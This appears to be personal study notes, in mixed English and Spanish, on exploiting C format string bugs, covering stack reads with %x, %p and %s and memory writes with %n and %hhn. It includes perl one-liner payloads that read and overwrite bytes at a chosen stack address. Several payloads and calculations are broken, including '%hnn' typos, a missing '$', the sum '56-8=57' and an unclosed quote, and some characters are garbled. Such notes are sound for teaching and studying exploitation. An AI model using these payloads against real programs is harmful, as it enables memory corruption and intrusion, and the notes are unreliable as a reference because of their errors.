# Format String
printf(format, ...) -> the first parameter is used to print the rest of the values. If we control that, we can force the reading and writing in memory.

## READING 
Until find /x00.
- `%x`: reads info from the stack (hex format)
- `%p`: reads info from the stack (pointer format = 0x%08x)
- `%s`: treats the following argument as a pointer and shows the bytes from that address
- `%9$x`: reads the 9ยบ param in hex
### Examples
- `printf("%s", buf)` -> correcto
- `printf("%s%s", buf)` -> ERROR. The second %s does not refer to any arg

Knowing the OFFSET we can write/read from it. Imagine offset = 10:
`printf("%10$s", buffer)` or `perl -e 'print "AAAA" . "%10$s"' | <.exe>`
Uses arg 10 of the stack treats it as a pointer and print what it finds there.

If we hace the dir of the payload (0xffffca44):
`perl -e 'print "\x44\xca\xff\xff" . "%10\$s" ' | <.exe>`


## WRITING
- `%n`: writes number of bytes in the address of the 1ยบ param
- `%3x%2$n`: writes a 3 in the address pointed by param 2

### Examples
- `printf("abcd%n", value)` -> value=4
- `printf("abcd%nef%n", val1, val2)` -> val1=4, val2=6

- Write a value: `printf("%1032c%n", val)` -> val=1032

- `perl -e 'print "\x44\xca\xff\xff" . "%10\$n" | <.exe>` -> in the 10th arg write the write the total number of bytes printed up to that point (before n) = 4

If we have PRUEBA and the buffer starts at address 0xffffca44 we can write:
- ARUEBA: `perl -e 'print "\x44\xca\xff\xff" . "%61c" . "%10\$hnn" | <.exe>` -> go to where arg 10th points and write A (ASCII code A=65 - 4 (already written \x44\xca\xff\xff) = 61)

- ABUEBA: 
    - Option 1: `perl -e 'print "\x44\xca\xff\xff" . "\x44\xca\xff\xff" . "%57c" . "%10\$hhn" . "%c" . "%11\hhn" | <.exe>`
    57 -> 56-8=57
    - Option 2: `perl -e 'print "\x44\xca\xff\xff" . "%16957c" . "%10\$hnn" | <.exe>`
    16957 -> B=66//A=65 -> 8b (A=4b+B=4b) = 66*2โธ=16896 -> 16896+65=16961 -> 16961-4=16957